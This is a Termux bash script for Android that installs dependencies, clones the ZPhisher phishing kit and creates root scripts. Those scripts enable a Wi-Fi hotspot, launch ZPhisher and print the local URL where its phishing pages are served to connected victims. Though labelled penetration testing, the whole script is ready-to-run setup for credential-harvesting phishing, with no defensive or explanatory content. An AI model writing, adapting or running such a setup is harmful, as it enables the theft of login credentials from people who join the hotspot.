#!/data/data/com.termux/files/usr/bin/bash

# Function to install dependencies
install_dependencies() {
    echo "Installing necessary dependencies..."
    pkg update
    pkg upgrade -y
    pkg install -y git python php tsu
}

# Function to clone ZPhisher repository
clone_zphisher() {
    echo "Cloning ZPhisher from GitHub..."
    if [ ! -d "$HOME/zphisher" ]; then
        git clone https://github.com/htr-tech/zphisher.git $HOME/zphisher
    else
        echo "ZPhisher is already cloned."
    fi
}

# Function to create hotspot enable script (hotspot_on.sh)
create_hotspot_on_script() {
    echo "Creating hotspot_on.sh script..."
    cat <<EOF > $HOME/hotspot_on.sh
#!/data/data/com.termux/files/usr/bin/bash

# Ensure we have root access
if [ "\$(id -u)" -ne 0 ]; then
  echo "This script requires root privileges."
  exit 1
fi

echo "Turning on hotspot..."

# Disable Wi-Fi (optional to ensure the hotspot works)
svc wifi disable

# Optional: Disable mobile data (you can comment this out if you need mobile data)
svc data disable

# Disable DUN requirement for tethering (some devices may need this)
settings put global tether_dun_required 0

# Start the hotspot (tethering)
start tethering
echo "Hotspot is now enabled."

# Wait a few seconds to make sure the hotspot is ready
sleep 5

# Get the IP address of the device
IP_ADDR=\$(ifconfig wlan0 | grep 'inet ' | awk '{print \$2}')

# Start ZPhisher after the hotspot is up
echo "Starting ZPhisher..."

# Navigate to the ZPhisher directory and launch it
cd /data/data/com.termux/files/home/zphisher
./zphisher.sh

# Output the IP address for access
echo "ZPhisher is hosted at: http://\$IP_ADDR:8080"
EOF

    chmod +x $HOME/hotspot_on.sh
}

# Function to create hotspot disable script (hotspot_off.sh)
create_hotspot_off_script() {
    echo "Creating hotspot_off.sh script..."
    cat <<EOF > $HOME/hotspot_off.sh
#!/data/data/com.termux/files/usr/bin/bash

# Ensure we have root access
if [ "\$(id -u)" -ne 0 ]; then
  echo "This script requires root privileges."
  exit 1
fi

# Stop the hotspot
echo "Stopping hotspot..."
stop tethering

# Optionally, re-enable Wi-Fi
svc wifi enable

# Optionally, re-enable mobile data
svc data enable

echo "Hotspot is now disabled."
EOF

    chmod +x $HOME/hotspot_off.sh
}

# Function to run the environment setup
setup_environment() {
    echo "Setting up penetration testing environment..."

    # Install dependencies
    install_dependencies

    # Clone ZPhisher repository
    clone_zphisher

    # Create necessary scripts
    create_hotspot_on_script
    create_hotspot_off_script

    echo "Environment setup complete!"
    echo "To start penetration testing:"
    echo "1. Run ./hotspot_on.sh to enable the hotspot, start ZPhisher, and display the link."
    echo "2. Run ./hotspot_off.sh to disable the hotspot when you're done."
}

# Run the environment setup
setup_environment
